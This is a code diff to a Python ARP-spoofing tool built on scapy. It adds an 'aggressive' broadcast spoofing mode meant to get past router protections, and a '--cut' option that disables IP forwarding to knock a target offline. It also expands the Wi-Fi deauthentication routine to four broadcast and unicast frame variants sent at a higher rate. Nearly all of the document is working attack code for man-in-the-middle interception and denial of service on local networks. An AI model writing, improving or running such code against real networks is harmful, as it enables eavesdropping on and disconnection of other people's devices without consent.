@@ -77,6 +77,7 @@ set_console_title(os.environ.get("ARP_SPOOFER_WINDOW_TITLE", title))
 CHECK_INTERVAL = 30
 TARGET_REFRESH_INTERVAL = 60
 TARGET_MAC_REFRESH_INTERVAL = 75
+SPOOF_INTERVAL = 2
 INTERNET_CHECK_TIMEOUT = 5
 INTERNET_CACHE_TTL = 15
 RECOVERY_COOLDOWN = 120
@@ -1535,6 +1536,8 @@ def get_arguments():
   - Use --spoof-mac to randomize your MAC address before attack.
   - Use --deauth to continuously send 802.11 deauth frames to a target IP.
   - Use --interval to control spoofing speed (default: 2.0s).
+  - Use --aggressive to use broadcast ARP spoofing (bypasses some router protections).
+  - Use --cut to disable IP forwarding (cuts target internet instead of silent MITM).
   - Use -i to list and select a network adapter (WiFi / Ethernet).
   - Use --manual to disable auto-detect (requires -r and -g).
   - Auto-detects gateway/range from the selected or best adapter (Windows).
@@ -1556,6 +1559,8 @@ def get_arguments():
     parser.add_argument("--spoof-mac", action="store_true", help="Randomize MAC address before starting")
     parser.add_argument("--deauth", dest="deauth", metavar="IP", help="Send 802.11 deauth frames to a specific IP")
     parser.add_argument("--interval", type=float, default=2.0, help="Spoofing interval in seconds (default: 2.0)")
+    parser.add_argument("--aggressive", action="store_true", help="Aggressive ARP spoofing (broadcast + unicast) to bypass router protections")
+    parser.add_argument("--cut", action="store_true", help="Cut target internet (DoS) instead of silent MITM. Disables IP forwarding.")
     parser.add_argument("-i", "--interface", nargs="?", const="__interactive__", default=None, metavar="N", help="List network adapters and select one (optional index, e.g. -i 2)")
     parser.add_argument("--manual", action="store_true", help="Manual mode: no auto-detect, requires -r and -g")
     parser.add_argument("--no-recovery", action="store_true", help="Disable automatic internet/WiFi recovery")
@@ -1627,15 +1632,21 @@ def visual_scan(ip_range):
     log_ok(f"Found {len(clients)} device(s).")
     return clients
 
-def enable_ip_forwarding():
+def enable_ip_forwarding(enable=True):
+    val = "1" if enable else "0"
     if os.name == "nt":
-        run_cmd("netsh interface ipv4 set global forwarding=enabled")
+        run_cmd(f"netsh interface ipv4 set global forwarding={'enabled' if enable else 'disabled'}")
         run_cmd(
             r'reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" '
-            r"/v IPEnableRouter /t REG_DWORD /d 1 /f"
+            rf"/v IPEnableRouter /t REG_DWORD /d {val} /f"
         )
     else:
-        run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        run_cmd(f"sysctl -w net.ipv4.ip_forward={val}")
+        try:
+            with open("/proc/sys/net/ipv4/ip_forward", "w", encoding="utf-8") as fh:
+                fh.write(val)
+        except OSError:
+            pass
 
 def restore(destination_ip, destination_mac, source_ip, source_mac):
     if not destination_mac or not source_mac:
@@ -1720,6 +1731,10 @@ class SpoofSession:
         self.sock = None
         self._packet_cache = []
         self._cache_dirty = True
+        try:
+            self.local_mac = scapy.get_if_hwaddr(conf.iface)
+        except Exception:
+            self.local_mac = "00:00:00:00:00:00"
 
     def _is_excluded_ip(self, ip: str, local_ip: str) -> bool:
         if not ip or ip == self.gateway or ip == local_ip:
@@ -1834,12 +1849,22 @@ class SpoofSession:
             if not t.get("mac"):
                 continue
                 
+            # Standard unicast spoofing
             self._packet_cache.append(
-                scapy.Ether(dst=t["mac"]) / scapy.ARP(op=2, pdst=t["ip"], hwdst=t["mac"], psrc=self.gateway)
+                scapy.Ether(src=self.local_mac, dst=t["mac"]) / scapy.ARP(op=2, hwsrc=self.local_mac, pdst=t["ip"], hwdst=t["mac"], psrc=self.gateway)
             )
             self._packet_cache.append(
-                scapy.Ether(dst=self.gateway_mac) / scapy.ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=t["ip"])
+                scapy.Ether(src=self.local_mac, dst=self.gateway_mac) / scapy.ARP(op=2, hwsrc=self.local_mac, pdst=self.gateway, hwdst=self.gateway_mac, psrc=t["ip"])
             )
+            
+            # Aggressive broadcast spoofing
+            if self.args.aggressive:
+                self._packet_cache.append(
+                    scapy.Ether(src=self.local_mac, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=2, hwsrc=self.local_mac, pdst=t["ip"], hwdst="ff:ff:ff:ff:ff:ff", psrc=self.gateway)
+                )
+                self._packet_cache.append(
+                    scapy.Ether(src=self.local_mac, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=2, hwsrc=self.local_mac, pdst=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=t["ip"])
+                )
             
         self._cache_dirty = False
 
@@ -1861,7 +1886,7 @@ class SpoofSession:
             except Exception:
                 pass
             try:
-                self.sock = scapy.L2socket(iface=conf.iface)
+                self.sock = conf.L2socket(iface=conf.iface)
             except Exception:
                 self.sock = None
 
@@ -1876,14 +1901,22 @@ class SpoofSession:
             return
             
         log_info(f"Deauth attack active on {target_ip} ({target_mac}) via {self.gateway_mac}")
-        pkt = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7)
+        
+        # 4-way deauth frame to guarantee disconnect
+        deauth_pkts = [
+            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7),
+            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=self.gateway_mac, addr2=target_mac, addr3=target_mac) / scapy.Dot11Deauth(reason=7),
+            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7),
+            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_mac, addr3=target_mac) / scapy.Dot11Deauth(reason=7)
+        ]
         
         while not self._stop.is_set():
-            try:
-                scapy.sendp(pkt, count=20, inter=0.02, verbose=False)
-            except Exception:
-                pass
-            self._stop.wait(1)
+            for pkt in deauth_pkts:
+                try:
+                    scapy.sendp(pkt, count=15, inter=0.01, verbose=False)
+                except Exception:
+                    pass
+            self._stop.wait(0.5)
 
     def watchdog_loop(self):
         while not self._stop.is_set():
@@ -1940,7 +1973,7 @@ class SpoofSession:
                 sys.exit(1)
 
         try:
-            self.sock = scapy.L2socket(iface=conf.iface)
+            self.sock = conf.L2socket(iface=conf.iface)
             log_ok(f"L2 raw socket opened on {conf.iface}")
         except Exception as exc:
             log_err(f"Failed to open L2 socket: {exc}. Falling back to standard sendp.")
@@ -2128,7 +2161,11 @@ def main():
     args.ip_range, args.gateway = resolve_network_args(args, selected)
     log_info(f"Network: {args.ip_range} | Gateway: {args.gateway}")
 
-    enable_ip_forwarding()
+    if args.cut:
+        log_warn("--cut mode active: IP forwarding disabled. Target internet will be dropped.")
+        enable_ip_forwarding(enable=False)
+    else:
+        enable_ip_forwarding(enable=True)
 
     initial_ctx = NetworkContext(
         ip_range=args.ip_range,
